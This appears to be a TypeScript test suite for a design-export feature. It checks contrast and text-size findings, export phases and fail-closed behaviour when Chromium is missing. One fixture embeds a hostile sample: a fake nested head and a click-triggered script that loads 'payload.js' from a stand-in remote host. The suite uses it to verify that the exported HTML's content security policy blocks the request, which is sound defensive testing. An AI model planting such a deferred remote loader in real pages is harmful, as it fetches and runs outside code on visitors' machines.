import { afterAll, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { mkdir, readFile, rm, stat, writeFile } from "node:fs/promises";
import path from "node:path";
import type { SequencedEventEnvelope } from "@bg/shared";
import JSZip from "jszip";
import { chromium } from "playwright-core";
import { getExportAttemptDetail, getExportJob } from "../src/db/exports";
import { runMigrations } from "../src/db/migrate-local";
import { getSqlite } from "../src/db/sqlite-client";
import { projectsDir } from "../src/lib/paths";
import { ArtifactCoordinator } from "../src/services/artifact-coordinator";
import { sequencedBroker } from "../src/services/broker";
import { activeExportBrowserCount } from "../src/services/export-browser-registry";
import { resetChromiumCapability, setChromiumCapabilityForTesting } from "../src/services/chromium-capability";
import { enqueueProjectExport } from "../src/services/exports";

const prefix = `audit-export-${process.pid}`;
const readyHtml = `<!doctype html><html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>:root{--paper:#fff;--ink:#111;--accent:#1647d8}*{box-sizing:border-box}html,body{margin:0;background:var(--paper);color:var(--ink);font-family:Arial,sans-serif}.stage{position:relative;min-height:700px;padding:24px}.a,.b{position:absolute;top:100px;width:120px;height:40px}.a{left:24px}.b{left:180px}</style></head><body><main class="stage" data-bg-node-id="ready-stage"><p data-bg-node-id="ready-copy">모든 검사를 통과하는 준비 상태</p><div class="a" data-bg-node-id="ready-a">측정 후보 A</div><div class="b" data-bg-node-id="ready-b">측정 후보 B</div></main></body></html>`;
const projects = [{ id: `${prefix}-blocked`, session: `${prefix}-blocked-session`, html: `<!doctype html><html><head><style>:root{--ink:#111}body{background:#fff;color:#aaa}.a,.b{position:absolute;width:80px}.a{left:10px}.b{left:120px}</style></head><body><p class="a" data-bg-node-id="a">Low contrast</p><p class="b" data-bg-node-id="b">Text</p></body></html>` }, { id: `${prefix}-recommended`, session: `${prefix}-recommended-session`, html: `<!doctype html><html><head><style>body{background:#fff;color:#111}.a,.b{position:absolute;width:80px}.a{left:10px}.b{left:120px}</style></head><body><p class="a" data-bg-node-id="a" style="font-size:9px">Small</p><p class="b" data-bg-node-id="b">Text</p></body></html>` }, { id: `${prefix}-ready`, session: `${prefix}-ready-session`, html: readyHtml }, { id: `${prefix}-no-render`, session: `${prefix}-no-render-session`, html: readyHtml }, { id: `${prefix}-deferred-remote`, session: `${prefix}-deferred-remote-session`, html: readyHtml.replace("<head>", "<template><head></head></template><head>").replace("</body>", `<script>addEventListener("click", () => { const remote = document.createElement("script"); remote.src = "https://example.invalid/payload.js"; document.head.append(remote); }, { once: true });</script></body>`) }] as const;

beforeAll(async () => {
  await runMigrations();
  for (const project of projects) { const root = path.join(projectsDir, project.id); await mkdir(root, { recursive: true }); await writeFile(path.join(root, "index.html"), project.html); getSqlite().prepare("INSERT INTO projects(id,name,type,dir_path,entrypoint,backend_id,created_at,updated_at) VALUES (?,?,'prototype',?,'index.html','codex',1,1)").run(project.id, project.id, root); getSqlite().prepare("INSERT INTO sessions(id,project_id,backend_id,status,created_at,updated_at,last_active_at) VALUES (?,?,'codex','idle',1,1,1)").run(project.session, project.id); await new ArtifactCoordinator(getSqlite()).initialize(project.id, root); }
});
beforeEach(() => setChromiumCapabilityForTesting(true));
afterAll(async () => { resetChromiumCapability(); for (const project of projects) { getSqlite().prepare("DELETE FROM projects WHERE id=?").run(project.id); await rm(path.join(projectsDir, project.id), { recursive: true, force: true }); } });

function nextTerminal(sessionId: string): Promise<SequencedEventEnvelope> { return new Promise((resolve, reject) => { const timeout = setTimeout(() => { unsubscribe(); reject(new TypeError("export terminal event timed out")); }, 60_000); const unsubscribe = sequencedBroker.subscribe(sessionId, (item) => { if (item.event.type !== "export.attempt" || item.event.status !== "failed" && item.event.status !== "validated") return; clearTimeout(timeout); unsubscribe(); resolve(item); }); }); }

describe("pre-export design audit", () => {
  test("Given must-fix contrast When exporting Then publication is blocked and findings persist", async () => {
    const terminal = nextTerminal(projects[0].session); const started = await enqueueProjectExport(projects[0].id, "html_zip", {}); if (started === null || started.latest_attempt === null) throw new TypeError("export did not start"); await terminal; const job = await getExportJob(started.id); const attempt = await getExportAttemptDetail(started.latest_attempt.id);
    expect(job?.status).toBe("failed"); expect(job?.output_path).toBeNull(); expect(job?.error_message).toContain("must-fix"); expect(attempt?.stop_reason).toBe("validation_failed"); expect(attempt?.findings.some((finding) => finding.code === "contrast")).toBeTrue();
  }, 70_000);

  test("Given only recommendations When exporting Then output publishes and findings remain", async () => {
    const terminal = nextTerminal(projects[1].session); const started = await enqueueProjectExport(projects[1].id, "html_zip", {}); if (started === null || started.latest_attempt === null) throw new TypeError("export did not start"); await terminal; const job = await getExportJob(started.id); const attempt = await getExportAttemptDetail(started.latest_attempt.id);
    expect(job?.error_message).toBeNull(); expect(job?.status).toBe("succeeded"); expect(job?.output_path).not.toBeNull(); expect(attempt?.findings.some((finding) => finding.code === "minimum_text_size")).toBeTrue(); expect(attempt?.findings).toContainEqual({ code: "design_audit:token_usage:skipped", path: null });
  }, 70_000);

  test("Given the all-eight-ready fixture When exporting HTML Then output publishes without findings", async () => {
    const phases: string[] = []; const terminal = nextTerminal(projects[2].session); const started = await enqueueProjectExport(projects[2].id, "html_zip", {}, { phase: (_attemptId, phase) => { phases.push(phase); } });
    if (started === null || started.latest_attempt === null) throw new TypeError("export did not start"); await terminal; const job = await getExportJob(started.id); const attempt = await getExportAttemptDetail(started.latest_attempt.id);
    expect(job?.status).toBe("succeeded"); expect(job?.output_path).not.toBeNull(); if (job?.output_path === null || job?.output_path === undefined) throw new TypeError("export output is unavailable"); expect((await stat(job.output_path)).isFile()).toBeTrue(); expect(attempt?.findings).toEqual([]); expect(phases).toEqual(["after_snapshot", "after_partial_render", "after_render", "after_validation", "after_receipt", "after_publish_before_db"]); expect(activeExportBrowserCount()).toBe(0);
  }, 70_000);

  test("Given Chromium is unavailable When exporting HTML Then publication fails closed", async () => {
    setChromiumCapabilityForTesting(false);
    try {
      const terminal = nextTerminal(projects[3].session);
      const started = await enqueueProjectExport(projects[3].id, "html_zip", {});
      if (started === null || started.latest_attempt === null) throw new TypeError("export did not start");
      await terminal;
      const job = await getExportJob(started.id);
      const attempt = await getExportAttemptDetail(started.latest_attempt.id);
      expect(job?.status).toBe("failed");
      expect(job?.output_path).toBeNull();
      expect(attempt?.findings).toEqual([]);
      expect(activeExportBrowserCount()).toBe(0);
    } finally {
      resetChromiumCapability();
    }
  }, 70_000);

  test("Given a nested fake head and deferred loader When opening HTML ZIP Then CSP blocks the request", async () => {
    const terminal = nextTerminal(projects[4].session);
    const started = await enqueueProjectExport(projects[4].id, "html_zip", {});
    if (started === null || started.latest_attempt === null) throw new TypeError("export did not start");
    await terminal;
    const job = await getExportJob(started.id);
    if (job?.output_path === null || job?.output_path === undefined) throw new TypeError("export output is unavailable");
    const zip = await JSZip.loadAsync(await readFile(job.output_path));
    const archivedHtml = await zip.file("index.html")?.async("string");
    if (archivedHtml === undefined) throw new TypeError("archived HTML is unavailable");
    const browser = await chromium.launch({ headless: true, channel: "chrome" });
    try {
      const page = await browser.newPage();
      await page.setContent(archivedHtml);
      const blocked = page.evaluate(() => new Promise<"blocked">((resolve) => {
        document.addEventListener("securitypolicyviolation", () => resolve("blocked"), { once: true });
        document.body.click();
      }));
      let timer: ReturnType<typeof setTimeout> | undefined;
      const timedOut = new Promise<never>((_, reject) => { timer = setTimeout(() => reject(new TypeError("CSP outcome timed out")), 5_000); });
      try { expect(await Promise.race([blocked, timedOut])).toBe("blocked"); }
      finally { if (timer !== undefined) clearTimeout(timer); }
    } finally { await browser.close(); }
  }, 70_000);
});
